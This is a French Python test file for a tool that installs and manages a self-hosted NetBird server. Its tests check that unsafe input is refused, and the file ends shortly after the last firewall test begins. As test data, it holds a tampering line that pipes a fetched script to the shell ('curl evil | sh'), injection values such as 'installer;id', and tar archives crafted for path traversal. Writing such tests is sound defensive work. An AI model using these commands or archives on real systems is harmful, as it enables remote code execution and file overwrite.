# ══════════════════════════════════════════════════════════════════════════════
# TITRE      : Bancs de la commande root `serveur` du module netbird
# LICENCE    : AGPL-3.0
# AUTEUR     : Atek Drisse
# GIT        : github.com/Marplestrange
# MAIL       : marplestrange@cassandra.center
# MODULE     : tests
# ZONE       : CN
# VERSION CN : 0.1.0  #9484ef
# VERSION EC : néant
# EC LIÉES   : néant
# RÔLE       : Bancs de la commande root `serveur` du module netbird : installer, mettre à jour et retirer un SERVEUR NetBird auto-hébergé. Ni Docker, ni réseau, ni ports ici : `executer`, `ouvrir`, `port_libre` et `shutil` sont remplacés ; le dossier du 
# MÉTHODE    : à compléter par l'auteur (comment le fichier s'y prend)
# ══════════════════════════════════════════════════════════════════════════════
# ▼▼▼ BORNE CN version=0.1.0 empreinte=9484ef ▼▼▼
"""Bancs de la commande root `serveur` du module netbird : installer, mettre à jour et retirer un SERVEUR NetBird auto-hébergé. Ni Docker, ni réseau, ni ports ici : `executer`, `ouvrir`,
`port_libre` et `shutil` sont remplacés ; le dossier du serveur est un dossier temporaire. On vérifie surtout ce qui est REFUSÉ et que le script n'est lancé que s'il est celui qu'on a confirmé."""
import hashlib
import io
import importlib.machinery
import importlib.util
import json
import shutil
import socket
import sys
import subprocess
import os
import tarfile
import tempfile
import types
import unittest
from pathlib import Path

RACINE = Path(__file__).resolve().parent.parent
SCRIPT = b"#!/bin/bash\necho 'installation NetBird'\n"
SHA = hashlib.sha256(SCRIPT).hexdigest()


def charger():
    chemin = str(RACINE / "modules" / "netbird" / "commandes" / "CN_serveur")
    l = importlib.machinery.SourceFileLoader("serveur_banc", chemin)
    s = importlib.util.spec_from_loader("serveur_banc", l)
    m = importlib.util.module_from_spec(s)
    l.exec_module(m)
    return m


class Monde(unittest.TestCase):
    def setUp(self):
        self.m = charger()
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.dossier = str(Path(self.tmp.name) / "netbird-serveur")
        self.m.DOSSIER = self.dossier
        self.cmds, self.envs, self.urls = [], [], []
        self.sorties = {}                                     # début de commande -> (code, sortie)
        self.occupes = set()                                  # ("tcp", 80)…
        self.docker = self.jq = True
        self.ufw = self.firewalld = False
        self.plugin = Path(self.tmp.name) / "docker-compose-plugin"
        self.plugin.write_text("#!/bin/sh")                           # le greffon `docker compose` est là, sauf test contraire
        self.m.PLUGINS_COMPOSE = (str(self.plugin),)
        self.legacy = False                                          # l'ancien binaire `docker-compose`
        self.paquets = "apt-get"                                   # le gestionnaire de paquets de la machine du banc
        self.m.SAUVEGARDES = str(Path(self.tmp.name) / "sauvegardes")
        self.compteur = 0
        self.m.maintenant = self.horloge
        self.corps = SCRIPT
        self.m.executer = self.faux
        self.m.ouvrir = self.faux_ouvrir
        self.m.port_libre = lambda proto, port: (proto, port) not in self.occupes
        self.m.shutil = types.SimpleNamespace(which=lambda x: "/usr/bin/" + x if (x == "docker" and self.docker) or (x == "jq" and self.jq) or (x == "ufw" and self.ufw) or (x == "firewall-cmd" and self.firewalld) or x == self.paquets or (x == "docker-compose" and self.legacy) else None, rmtree=__import__("shutil").rmtree)

    def faux(self, commande, capture_output=True, text=True, timeout=0, cwd=None, env=None):
        self.cmds.append(list(commande))
        self.envs.append(env or {})
        for debut, (code, sortie) in self.sorties.items():
            if " ".join(commande).startswith(debut):
                return types.SimpleNamespace(returncode=code, stdout=sortie, stderr="")
        return types.SimpleNamespace(returncode=0, stdout="ok", stderr="")

    def horloge(self):
        self.compteur += 1
        return "20261109-%06d" % (100000 + self.compteur)

    def faux_ouvrir(self, url, timeout=0):
        self.urls.append(url)
        corps = self.corps

        class R:
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

            def read(self, n=-1):
                return corps[:n] if n and n > 0 else corps
        return R()

    def lance(self, *argv):
        return self.m.serveur(list(argv))

    def poser(self, **meta):
        """Un serveur déjà posé."""
        os.makedirs(self.dossier, exist_ok=True)
        Path(self.dossier, "cassandra.json").write_text(json.dumps(dict({"version": "v0.40.0", "domaine": "netbird.exemple.fr", "proxy": "nginx"}, **meta)))

    def telecharge(self):
        self.assertTrue(self.lance("telecharger", "v0.40.0")["ok"])
        self.cmds.clear()


class Refus(Monde):
    def test_un_verbe_hors_table_est_refuse(self):
        for v in ("rm", "bash", "", "installer;id"):
            self.assertFalse(self.lance(v)["ok"], v)
        self.assertFalse(self.cmds)

    def test_la_version_est_explicite(self):
        for v in ("latest", "0.40.0", "v0.40", "v0.40.0;id", "v1.2.3.4", "../v0.40.0", ""):
            self.assertFalse(self.lance("telecharger", v)["ok"], v)
        self.assertFalse(self.urls, "rien n'est téléchargé pour une version illisible")

    def test_installer_refuse_les_arguments_suspects(self):
        self.telecharge()
        base = ["v0.40.0", SHA, "netbird.exemple.fr", "admin@exemple.fr", "nginx"]
        for i, mauvais in ((0, "latest"), (1, "abc"), (1, "G" * 64), (2, "pas un domaine"), (2, "192.168.1.5"), (2, "a;b.fr"), (2, "netbird.example.com"), (2, "x.test"),
                           (3, "pas-un-mail"), (3, "a b@c.fr"), (4, "apache"), (4, "traefik;id")):
            argv = list(base)
            argv[i] = mauvais
            self.assertFalse(self.lance("installer", *argv)["ok"], (i, mauvais))
        self.assertFalse(self.lance("installer", *base[:4])["ok"], "il manque le proxy")
        self.assertFalse(self.cmds, "aucune commande lancée")


class Telecharger(Monde):
    def test_le_script_est_pose_et_son_empreinte_rendue(self):
        r = self.lance("telecharger", "v0.40.0")
        self.assertTrue(r["ok"], r)
        self.assertEqual((r["sha256"], r["taille"], r["version"]), (SHA, len(SCRIPT), "v0.40.0"))
        self.assertEqual(self.urls, ["https://github.com/netbirdio/netbird/releases/download/v0.40.0/getting-started.sh"])
        chemin = Path(self.dossier, "getting-started.sh")
        self.assertEqual(chemin.read_bytes(), SCRIPT)
        if os.name == "posix":
            self.assertEqual(oct(chemin.stat().st_mode & 0o777), "0o600", "ni lisible ni exécutable par les autres")

    def test_un_script_vide_ou_demesure_est_refuse(self):
        for corps in (b"", b"x" * 300001):
            self.corps = corps
            self.assertFalse(self.lance("telecharger", "v0.40.0")["ok"])

    def test_un_serveur_deja_pose_n_est_pas_retelecharge(self):
        self.poser()
        r = self.lance("telecharger", "v0.40.0")
        self.assertFalse(r["ok"])
        self.assertIn("déjà posé", r["erreur"])
        self.assertFalse(self.urls)


class Installer(Monde):
    ARGS = ("installer", "v0.40.0", SHA, "netbird.exemple.fr", "admin@exemple.fr")

    def test_le_script_n_est_lance_que_s_il_est_celui_qu_on_a_confirme(self):
        self.telecharge()
        Path(self.dossier, "getting-started.sh").write_bytes(SCRIPT + b"curl evil | sh\n")      # changé après la confirmation
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("n'est pas celle que tu as confirmée", r["erreur"])
        self.assertFalse(self.cmds, "le script modifié n'est pas exécuté")
        self.assertFalse(Path(self.dossier, "cassandra.json").exists())

    def test_sans_telechargement_rien_n_est_lance(self):
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("telecharger", r["erreur"])
        self.assertFalse(self.cmds)

    def test_nginx_le_serveur_sans_question_et_sans_cle_ni_secret_en_ligne_de_commande(self):
        self.telecharge()
        r = self.lance(*self.ARGS, "nginx")
        self.assertTrue(r["ok"], r)
        self.assertEqual(len(self.cmds), 1)
        self.assertEqual(self.cmds[0][0], "bash")
        self.assertTrue(self.cmds[0][1].startswith(os.path.join(self.dossier, ".installer-")), "une copie neuve de ce qui a été haché, pas le fichier que bash rouvrirait")
        self.assertFalse(Path(self.cmds[0][1]).exists(), "la copie est effacée après le lancement")
        env = self.envs[0]
        self.assertEqual((env["NETBIRD_DOMAIN"], env["NETBIRD_NON_INTERACTIVE"], env["NETBIRD_REVERSE_PROXY_TYPE"], env["NETBIRD_ENABLE_PROXY"], env["NETBIRD_ENABLE_CROWDSEC"]),
                         ("netbird.exemple.fr", "true", "2", "false", "false"))
        self.assertNotIn("NETBIRD_LETSENCRYPT_EMAIL", env, "l'e-mail Let's Encrypt ne sert qu'au Traefik intégré")
        self.assertFalse([k for k in env if k not in ("PATH", "HOME", "LANG") and not k.startswith("NETBIRD_")], "l'environnement est construit ici, pas reçu")
        meta = json.loads(Path(self.dossier, "cassandra.json").read_text())
        self.assertEqual((meta["version"], meta["domaine"], meta["proxy"], meta["sha256"]), ("v0.40.0", "netbird.exemple.fr", "nginx", SHA))

    def test_traefik_exige_les_ports_80_et_443_libres(self):
        self.telecharge()
        self.occupes = {("tcp", 443)}
        r = self.lance(*self.ARGS, "traefik")
        self.assertFalse(r["ok"])
        self.assertIn("443/tcp", r["erreur"])
        self.assertIn("nginx", r["erreur"], "il dit quoi choisir à la place")
        self.assertFalse(self.cmds)
        self.occupes = set()
        self.assertTrue(self.lance(*self.ARGS, "traefik")["ok"])
        env = self.envs[-1]
        self.assertEqual((env["NETBIRD_REVERSE_PROXY_TYPE"], env["NETBIRD_LETSENCRYPT_EMAIL"]), ("0", "admin@exemple.fr"))

    def test_avec_un_proxy_existant_les_ports_80_et_443_ne_gênent_pas_mais_le_stun_oui(self):
        self.telecharge()
        self.occupes = {("tcp", 80), ("tcp", 443)}
        self.assertTrue(self.lance(*self.ARGS, "caddy")["ok"])
        self.assertEqual(self.envs[-1]["NETBIRD_REVERSE_PROXY_TYPE"], "4")
        Path(self.dossier, "cassandra.json").unlink()
        self.occupes = {("udp", 3478)}
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("3478/udp", r["erreur"])

    def test_sans_docker_ou_sans_jq(self):
        self.telecharge()
        self.docker = False
        self.assertIn("Docker", self.lance(*self.ARGS, "nginx")["erreur"])
        self.docker, self.jq = True, False
        self.assertIn("jq", self.lance(*self.ARGS, "nginx")["erreur"])
        self.assertFalse(self.cmds)

    def test_un_serveur_n_est_jamais_ecrase(self):
        self.telecharge()
        self.poser()
        self.assertIn("jamais écrasé", self.lance(*self.ARGS, "nginx")["erreur"])
        Path(self.dossier, "cassandra.json").unlink()
        Path(self.dossier, "config.yaml").write_text("x")                                      # une installation faite sans Cassandra
        self.assertIn("jamais écrasé", self.lance(*self.ARGS, "nginx")["erreur"])
        self.assertFalse(self.cmds)

    def test_un_script_qui_echoue_laisse_une_marque_qui_permet_de_le_retirer(self):
        self.telecharge()
        self.sorties["bash"] = (1, "Error: Docker socket not readable")
        r = self.lance(*self.ARGS, "nginx")
        self.assertFalse(r["ok"])
        self.assertIn("Docker socket", r["sortie"])
        self.assertEqual(json.loads(Path(self.dossier, "cassandra.json").read_text())["etat"], "echec")
        e = self.lance("etat")
        self.assertTrue(e["installe"] and e["partiel"], "l'état dit qu'une installation est inachevée")
        self.assertIn("inachevée", self.lance(*self.ARGS, "nginx")["erreur"], "on ne réinstalle pas par-dessus")
        Path(self.dossier, "config.yaml").write_text("x")                                      # ce que le script avait eu le temps de poser
        r = self.lance("retirer", "purger")
        self.assertTrue(r["ok"] and r["purge"], r)
        self.assertFalse(Path(self.dossier).exists(), "plus rien ne bloque une nouvelle installation")

    def test_un_reste_sans_pile_se_retire_meme_sans_docker_compose(self):
        self.telecharge()
        self.sorties["bash"] = (1, "Error")
        self.lance(*self.ARGS, "nginx")
        self.cmds.clear()
        r = self.lance("retirer")                                                              # même sans « purger » : il n'y a rien à garder
        self.assertTrue(r["ok"] and r["purge"], r)
        self.assertFalse([c for c in self.cmds if c[:2] == ["docker", "compose"]], "pas de docker-compose.yml : rien à arrêter")

    def test_un_delai_depasse_laisse_aussi_une_marque(self):
        self.telecharge()

        def lent(commande, **kw):
            raise subprocess.TimeoutExpired(commande, 1)
        self.m.executer = lent
        r = self.lance(*self.ARGS, "nginx")
        self.assertEqual(r["erreur"], "délai dépassé")
        self.assertEqual(json.loads(Path(self.dossier, "cassandra.json").read_text())["etat"], "echec")
        self.assertFalse(list(Path(self.dossier).glob(".installer-*")), "la copie du script ne traîne pas")

    def test_la_marque_d_un_succes_dit_ok_et_une_marque_ancienne_vaut_ok(self):
        self.telecharge()
        self.assertTrue(self.lance(*self.ARGS, "nginx")["ok"])
        self.assertEqual(json.loads(Path(self.dossier, "cassandra.json").read_text())["etat"], "ok")
        self.assertFalse(self.lance("etat")["partiel"])
        self.poser()                                                                           # sans « etat » : posée avant ce réglage
        self.assertFalse(self.lance("etat")["partiel"])

    def test_derriere_nginx_ou_caddy_les_ports_8080_et_8081_doivent_etre_libres(self):
        self.telecharge()
        self.occupes = {("tcp", 8080)}
        for proxy in ("nginx", "caddy"):
            r = self.lance(*self.ARGS, proxy)
            self.assertFalse(r["ok"], proxy)
            self.assertIn("8080/tcp", r["erreur"])
            self.assertIn("127.0.0.1", r["erreur"])
        self.assertFalse(self.cmds, "rien n'est lancé : on ne laisse pas une pile à moitié posée")
        self.occupes = {("tcp", 8080)}
        self.assertTrue(self.lance(*self.ARGS, "traefik")["ok"], "avec traefik, 8080 ne gêne pas")

    def test_les_tld_punycode_passent_et_les_domaines_reserves_non(self):
        self.telecharge()
        for ok in ("netbird.exemple.xn--p1ai", "netbird.exemple.fr"):
            self.assertTrue(self.m.DOMAINE.match(ok), ok)
        for mauvais in ("netbird.local", "x.invalid", "x.localhost", "x.example.org", "example.org"):
            r = self.lance("installer", "v0.40.0", SHA, mauvais, "admin@exemple.fr", "nginx")
            self.assertFalse(r["ok"], mauvais)
            self.assertFalse(self.cmds, mauvais)



class PortsReels(unittest.TestCase):
    @unittest.skipIf(sys.platform == "win32", "SO_REUSEADDR n'a pas le même sens sous Windows : le banc vise la machine du serveur")
    def test_un_port_en_ecoute_est_pris_ipv4_ou_ipv6_et_un_port_libre_ne_l_est_pas(self):
        m = charger()
        v4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.addCleanup(v4.close)
        v4.bind(("0.0.0.0", 0))
        v4.listen(1)
        self.assertFalse(m.port_libre("tcp", v4.getsockname()[1]), "écoute IPv4")
        try:
            v6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        except OSError:
            self.skipTest("pas d'IPv6 ici")
        self.addCleanup(v6.close)
        v6.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
        v6.bind(("::", 0))
        v6.listen(1)
        self.assertFalse(m.port_libre("tcp", v6.getsockname()[1]), "écoute IPv6 seule")
        libre = socket.socket()
        libre.bind(("0.0.0.0", 0))
        port = libre.getsockname()[1]
        libre.close()                                                                          # le port vient d'être fermé : en TIME_WAIT ou non, il est libre
        self.assertTrue(m.port_libre("tcp", port))


class Exploitation(Monde):

    def test_etat_sans_serveur_et_avec(self):
        r = self.lance("etat")
        self.assertEqual((r["installe"], r["docker"], r["jq"], r["conteneurs"]), (False, True, True, []))
        self.poser()
        self.sorties["docker compose"] = (0, '{"Service":"netbird-server","State":"running","Image":"netbirdio/netbird-server:latest"}\n{"Service":"dashboard","State":"exited","Image":"netbirdio/dashboard:latest"}')
        r = self.lance("etat")
        self.assertEqual((r["installe"], r["meta"]["domaine"], [(c["service"], c["etat"]) for c in r["conteneurs"]]), (True, "netbird.exemple.fr", [("netbird-server", "running"), ("dashboard", "exited")]))

    def test_etat_dit_les_ports_pris_avant_l_installation(self):
        self.occupes = {("tcp", 443), ("udp", 3478)}
        r = self.lance("etat")
        self.assertEqual(sorted(r["occupes"]), ["tcp/443", "udp/3478"])

    def test_etat_installe_ne_cherche_plus_les_ports_mais_rend_ceux_des_conteneurs(self):
        self.poser()
        self.sorties["docker compose"] = (0, '{"Service":"netbird-server","State":"running","Image":"i","Publishers":[{"URL":"127.0.0.1","TargetPort":80,"PublishedPort":8081,"Protocol":"tcp"},{"URL":"::","TargetPort":3478,"PublishedPort":0,"Protocol":"udp"}]}')
        r = self.lance("etat")
        self.assertNotIn("occupes", r)
        self.assertEqual(r["conteneurs"][0]["ports"], ["127.0.0.1:8081->80/tcp"])

    def test_etat_garde_tous_les_services_meme_quand_la_sortie_est_longue(self):
        self.poser()
        etiquettes = {"com.docker.compose.%d" % i: "x" * 80 for i in range(8)}
        lignes = [json.dumps({"Service": "svc%d" % i, "State": "running", "Image": "img:%d" % i, "Labels": etiquettes}) for i in range(7)]
        self.sorties["docker compose"] = (0, "\n".join(lignes))
        self.assertGreater(len("\n".join(lignes)), 4000, "la sortie dépasse la limite des autres commandes")
        self.assertEqual([c["service"] for c in self.lance("etat")["conteneurs"]], ["svc%d" % i for i in range(7)])

    def test_etat_lit_aussi_un_tableau_json(self):

        self.poser()
        self.sorties["docker compose"] = (0, '[{"Service":"traefik","State":"running","Image":"traefik:v3"}]')
        self.assertEqual([c["service"] for c in self.lance("etat")["conteneurs"]], ["traefik"])

    def test_commande_table_fermee(self):
        self.poser()
        for act in ("up", "down", "restart", "logs"):
            self.assertTrue(self.lance("commande", act)["ok"], act)
        attendu = [["up", "-d"], ["down"], ["restart"], ["logs", "--tail", "80", "--no-color"]]
        self.assertEqual([c[4:] for c in self.cmds], attendu)
        self.assertTrue(all(c[:3] == ["docker", "compose", "-f"] for c in self.cmds))
        self.cmds.clear()
        for mauvais in (("exec",), ("up", "-d"), ("rm", "-f"), ()):
            self.assertFalse(self.lance("commande", *mauvais)["ok"], mauvais)
        self.assertFalse(self.cmds)

    def test_sans_serveur_pose_rien_ne_se_lance(self):
        for argv in (("commande", "up"), ("mettre_a_jour",), ("retirer",), ("nginx",)):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        self.assertFalse(self.cmds)

    def test_mettre_a_jour_tire_les_images_puis_relance_et_s_arrete_au_premier_echec(self):
        self.poser()
        self.assertTrue(self.lance("mettre_a_jour")["ok"])
        self.assertEqual([c[4:] for c in self.cmds], [["pull"], ["up", "-d"]])
        self.cmds.clear()
        self.sorties["docker compose -f " + os.path.join(self.dossier, "docker-compose.yml") + " pull"] = (1, "pull access denied")
        r = self.lance("mettre_a_jour")
        self.assertFalse(r["ok"])
        self.assertEqual([c[4:] for c in self.cmds], [["pull"]], "pas de `up` sur des images qui ne sont pas venues")

    def test_la_conf_nginx_se_lit(self):
        self.poser()
        self.assertIn("proxy", self.lance("nginx")["erreur"])
        Path(self.dossier, "nginx-netbird.conf").write_text("server { listen 443 ssl; }")
        self.assertEqual(self.lance("nginx")["conf"], "server { listen 443 ssl; }")

    def test_retirer_garde_les_volumes_sauf_purge(self):
        self.poser()
        self.assertTrue(self.lance("retirer")["ok"])
        self.assertEqual([c[4:] for c in self.cmds], [["down"]])
        self.assertTrue(Path(self.dossier, "cassandra.json").exists(), "sans purge, le dossier et ce que Cassandra en sait restent")
        self.cmds.clear()
        r = self.lance("retirer", "purger")
        self.assertTrue(r["ok"] and r["purge"])
        self.assertEqual([c[4:] for c in self.cmds], [["down", "-v", "--remove-orphans"]])
        self.assertFalse(Path(self.dossier).exists())

    def test_retirer_refuse_ce_qui_n_est_pas_un_usage(self):
        self.poser()
        for argv in (("retirer", "tout"), ("retirer", "purger", "x")):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        self.assertFalse(self.cmds)

    def test_une_purge_dont_le_dossier_resiste_le_dit_sans_echouer(self):
        self.poser()

        def refuse(chemin):
            raise PermissionError("verrouillé")
        self.m.shutil = types.SimpleNamespace(which=self.m.shutil.which, rmtree=refuse)
        r = self.lance("retirer", "purger")
        self.assertTrue(r["ok"] and r["purge"], "les volumes sont détruits : le retrait a eu lieu")
        self.assertIn("à retirer à la main", r["avertissement"])
        self.assertFalse(Path(self.dossier, "cassandra.json").exists(), "plus de marque : le serveur n'est plus donné pour posé")

    def test_un_retrait_qui_echoue_ne_supprime_rien(self):

        self.poser()
        self.sorties["docker compose"] = (1, "Cannot connect to the Docker daemon")
        r = self.lance("retirer", "purger")
        self.assertFalse(r["ok"])
        self.assertTrue(Path(self.dossier, "cassandra.json").exists(), "on ne supprime pas le dossier d'une pile qu'on n'a pas pu arrêter")

    def test_un_lien_symbolique_a_la_place_du_dossier_est_refuse(self):
        cible = Path(self.tmp.name) / "ailleurs"
        cible.mkdir()
        try:
            os.symlink(cible, self.dossier)
        except (OSError, NotImplementedError):
            self.skipTest("liens symboliques non permis ici")
        (cible / "cassandra.json").write_text("{}")
        for argv in (("retirer", "purger"), ("telecharger", "v0.40.0")):
            r = self.lance(*argv)
            self.assertFalse(r["ok"], argv)
        self.assertTrue(cible.exists(), "la cible du lien n'est jamais supprimée")


def monde_pile(t):
    """Une pile posée : un volume réel (dossier temporaire) et les réponses de docker qui le décrivent."""
    vol = Path(t.tmp.name) / "docker" / "netbird_data" / "_data"
    vol.mkdir(parents=True)
    (vol / "store.db").write_text("comptes-v1")
    t.poser()
    Path(t.dossier, "config.yaml").write_text("config-v1")
    Path(t.dossier, "docker-compose.yml").write_text("services: {}")
    t.vol = vol
    fiche = {"Name": "/netbird-server-1", "Image": "sha256:" + "a" * 64, "Config": {"Image": "netbirdio/netbird-server:latest", "Labels": {"com.docker.compose.service": "netbird-server"}},
             "Mounts": [{"Type": "volume", "Name": "netbird_data", "Source": str(vol)}, {"Type": "bind", "Source": "/etc/x"}]}
    ps = os.path.join(t.dossier, "docker-compose.yml")
    t.sorties["docker compose -f %s ps -a -q" % ps] = (0, "abc123def456")
    t.sorties["docker compose -f %s ps -a --format json" % ps] = (0, '{"Service":"netbird-server","State":"running","Image":"i"}')
    t.sorties["docker inspect abc123def456"] = (0, json.dumps([fiche]))
    t.sorties["docker volume inspect"] = (0, str(vol))
    return vol


class Sauvegardes(Monde):
    def setUp(self):
        super().setUp()
        self.vol = monde_pile(self)

    def commandes(self):
        return [" ".join(c[4:]) if c[:3] == ["docker", "compose", "-f"] else " ".join(c) for c in self.cmds]

    def test_sauvegarder_copie_le_volume_et_le_dossier_sans_rien_perdre(self):
        r = self.lance("sauvegarder", "avant_maj")
        self.assertTrue(r["ok"], r)
        d = Path(self.m.SAUVEGARDES, r["id"])
        meta = json.loads((d / "meta.json").read_text())
        self.assertEqual((meta["raison"], meta["version"], meta["domaine"]), ("avant_maj", "v0.40.0", "netbird.exemple.fr"))
        self.assertEqual(meta["images"], [{"service": "netbird-server", "ref": "netbirdio/netbird-server:latest", "id": "sha256:" + "a" * 64}])
        self.assertEqual([v["nom"] for v in meta["volumes"]], ["netbird_data"])
        with tarfile.open(d / "volume-0.tar.gz") as t:
            self.assertIn("./store.db", t.getnames())
        with tarfile.open(d / "dossier.tar.gz") as t:
            self.assertIn("./config.yaml", t.getnames())
        cmds = self.commandes()
        self.assertLess(cmds.index("stop"), cmds.index("start"), "le serveur est arrêté pour la copie, puis relancé")
        self.assertTrue(os.stat(d).st_mode & 0o777 in (0o700, 0o777), "le dossier n'est lisible que par root")

    def test_un_serveur_arrete_n_est_pas_relance_par_la_sauvegarde(self):
        ps = os.path.join(self.dossier, "docker-compose.yml")
        self.sorties["docker compose -f %s ps -a --format json" % ps] = (0, '{"Service":"netbird-server","State":"exited","Image":"i"}')
        self.assertTrue(self.lance("sauvegarder")["ok"])
        self.assertNotIn("start", self.commandes())
        self.assertNotIn("stop", self.commandes())

    def test_sauvegarder_refuse_ce_qui_n_est_pas_prevu(self):
        for argv in (("sauvegarder", "nimporte"), ("sauvegarder", "manuelle", "x")):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        Path(self.dossier, "cassandra.json").unlink()
        self.assertIn("aucun serveur", self.lance("sauvegarder")["erreur"])

    def test_une_sauvegarde_qui_echoue_ne_laisse_rien_et_relance_le_serveur(self):
        self.m.archiver = lambda *a, **k: (_ for _ in ()).throw(OSError("disque plein"))
        r = self.lance("sauvegarder")
        self.assertFalse(r["ok"])
        self.assertEqual(os.listdir(self.m.SAUVEGARDES), [], "pas de sauvegarde à moitié écrite")
        self.assertIn("start", self.commandes(), "le serveur n'est pas laissé arrêté")

    def test_un_volume_dont_le_dossier_est_inattendu_est_refuse(self):
        for source in ("/etc", "relatif/_data", "/var/lib/docker/volumes/autre/_data"):
            with self.assertRaises(ValueError, msg=source):
                self.m.source_volume("netbird_data", source)

    def test_seules_les_dix_plus_recentes_sont_gardees(self):
        for _ in range(12):
            self.assertTrue(self.lance("sauvegarder")["ok"])
        r = self.lance("sauvegardes")
        self.assertEqual(len(r["sauvegardes"]), 10)
        self.assertEqual(r["sauvegardes"][0]["id"], "20261109-100012", "la plus récente d'abord")
        self.assertEqual(r["sauvegardes"][-1]["id"], "20261109-100003")
        self.assertEqual((r["garde"], r["sauvegardes"][0]["raison"], r["sauvegardes"][0]["version"]), (10, "manuelle", "v0.40.0"))

    def test_la_liste_ignore_ce_qui_n_est_pas_une_sauvegarde(self):
        self.assertTrue(self.lance("sauvegarder")["ok"])
        Path(self.m.SAUVEGARDES, "pas-un-id").mkdir()
        Path(self.m.SAUVEGARDES, "20260101-000000").mkdir()                                     # sans meta.json
        self.assertEqual(len(self.lance("sauvegardes")["sauvegardes"]), 1)

    def test_restaurer_remet_le_volume_et_la_config_apres_une_sauvegarde_de_securite(self):
        ident = self.lance("sauvegarder", "avant_maj")["id"]
        (self.vol / "store.db").write_text("comptes-v2-abimes")
        Path(self.dossier, "config.yaml").write_text("config-v2")
        self.cmds.clear()
        r = self.lance("restaurer", ident)
        self.assertTrue(r["ok"], r)
        self.assertEqual((self.vol / "store.db").read_text(), "comptes-v1")
        self.assertEqual(Path(self.dossier, "config.yaml").read_text(), "config-v1")
        raisons = [x["raison"] for x in self.lance("sauvegardes")["sauvegardes"]]
        self.assertIn("avant_restauration", raisons, "ce qui était là est copié avant d'être remplacé")
        cmds = self.commandes()
        self.assertIn("down", cmds)
        self.assertEqual(cmds[-1], "up -d")
        self.assertFalse([c for c in cmds if "--force-recreate" in c or c.startswith("docker tag")], "sans « images », les images ne bougent pas")

    def test_restaurer_avec_images_remet_les_anciennes_images_et_recree(self):
        ident = self.lance("sauvegarder", "avant_maj")["id"]
        self.cmds.clear()
        r = self.lance("restaurer", ident, "images")
        self.assertTrue(r["ok"] and r["images_remises"] == 1, r)
        self.assertIn("docker tag sha256:%s netbirdio/netbird-server:latest" % ("a" * 64), self.commandes())
        self.assertEqual(self.commandes()[-1], "up -d --force-recreate")

    def test_restaurer_apres_un_retrait_avec_donnees_remet_aussi_la_marque(self):
        ident = self.lance("sauvegarder", "avant_retrait")["id"]
        shutil.rmtree(self.dossier)
        (self.vol / "store.db").unlink()
        r = self.lance("restaurer", ident)
        self.assertTrue(r["ok"], r)
        self.assertTrue(Path(self.dossier, "cassandra.json").exists())
        self.assertEqual((self.vol / "store.db").read_text(), "comptes-v1")
        self.assertFalse(self.lance("etat")["partiel"])

    def test_restaurer_refuse_ce_qui_est_suspect(self):
        ident = self.lance("sauvegarder")["id"]
        for argv in (("restaurer",), ("restaurer", "../x"), ("restaurer", ident, "tout"), ("restaurer", "20200101-000000"), ("restaurer", ident, "images", "x")):
            self.assertFalse(self.lance(*argv)["ok"], argv)
        self.cmds.clear()
        d = Path(self.m.SAUVEGARDES, ident)
        fiche = json.loads((d / "meta.json").read_text())
        fiche["volumes"] = [{"nom": "../../etc", "fichier": "volume-0.tar.gz"}]
        (d / "meta.json").write_text(json.dumps(fiche))
        self.assertIn("volume illisible", self.lance("restaurer", ident)["erreur"])
        self.assertFalse([c for c in self.commandes() if c in ("down", "up -d")], "rien n'est arrêté pour une sauvegarde illisible")

    def test_une_archive_qui_sort_de_son_dossier_est_refusee(self):
        dest = Path(self.tmp.name) / "dest"
        dest.mkdir()
        for nom, fabriquer in (("chemin.tar.gz", lambda t: t.addfile(self.membre("../evil.txt", b"x"), io.BytesIO(b"x"))),
                               ("absolu.tar.gz", lambda t: t.addfile(self.membre("/tmp/evil.txt", b"x"), io.BytesIO(b"x"))),
                               ("lien.tar.gz", lambda t: t.addfile(self.lien("ici", "../../dehors"))),
                               ("special.tar.gz", lambda t: t.addfile(self.special("fifo")))):
            archive = Path(self.tmp.name) / nom
            with tarfile.open(archive, "w:gz") as t:
                fabriquer(t)
            with self.assertRaises(ValueError, msg=nom):
                self.m.extraire(str(archive), str(dest))
        self.assertEqual(os.listdir(dest), [], "rien n'a été extrait")
        self.assertFalse(Path(self.tmp.name, "evil.txt").exists())

    @staticmethod
    def membre(nom, corps):
        i = tarfile.TarInfo(nom)
        i.size = len(corps)
        return i

    @staticmethod
    def lien(nom, cible):
        i = tarfile.TarInfo(nom)
        i.type, i.linkname = tarfile.SYMTYPE, cible
        return i

    @staticmethod
    def special(nom):
        i = tarfile.TarInfo(nom)
        i.type = tarfile.FIFOTYPE
        return i


class PareFeu(Monde):
    UFW = "Status: active\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW       Anywhere\n443/tcp                    ALLOW       Anywhere\n443/tcp (v6)               ALLOW       Anywhere (v6)\n"

    def test_ufw_actif_et_les_ports_de_netbird_deja_ouverts(self):
        self.ufw = True
        self.sorties["ufw status"] = (0, self.UFW)
        r = self.lance("pare_feu")
        self.assertEqual((r["outil"], r["actif"], r["ouverts"]), ("ufw", True, ["443/tcp"]), "22/tcp n'est pas un port de NetBird : il n'est pas rendu")

    def test_ufw_inactif_firewalld_et_aucun(self):
        self.ufw = True
        self.sorties["ufw status"] = (0, "Status: inactive")
        self.assertFalse(self.lance("pare_feu")["actif"])
        self.ufw, self.firewalld = False, True
        self.sorties["firewall-cmd --state"] = (0, "running")
        self.sorties["firewall-cmd --list-ports"] = (0, "3478/udp 8000/tcp")
        r = self.lance("pare_feu")
        self.assertEqual((r["outil"], r["actif"], r["ouverts"]), ("firewalld", True, ["3478/udp"]))
        self.firewalld = False
        self.assertEqual(self.lance("pare_feu"), {"ok": True, "outil": "", "actif": False, "ouverts": []})

    def test_ouvrir_ne_pose_que_ce_qui_manque_et_dit_ce_qu_elle_a_fait(self):
        self.ufw = True
        self.sorties["ufw status"] = (0, self.UFW)
        r = self.lance("pare_feu_ouvrir", "nginx")
        self.assertTrue(r["ok"], r)
